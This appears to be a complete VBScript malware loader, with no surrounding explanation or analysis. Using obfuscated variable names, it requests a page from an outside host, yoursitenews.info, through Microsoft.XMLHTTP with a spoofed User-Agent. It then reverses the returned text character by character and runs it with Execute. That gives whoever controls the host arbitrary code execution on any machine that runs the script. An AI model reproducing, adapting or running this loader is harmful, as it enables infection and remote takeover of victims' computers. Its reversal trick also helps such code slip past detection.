U1aqI="JYDaHvWB0s5EBnXmnaJwLSLfs"
URL="http://yoursitenews.info/?join=hugr&" & U1aqI
set Nzf7Q=CreateObject("Microsoft.XMLHTTP")
with Nzf7Q
.open "GET",URL,false
.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
.setRequestHeader "User-Agent", "RemoveIT"
.send "Z"

For i = Len(.responsetext) to 1  Step-1
    var= Mid(.responsetext,  i  , 1)
    guV5N = guV5N & var
Next
Execute guV5N
end with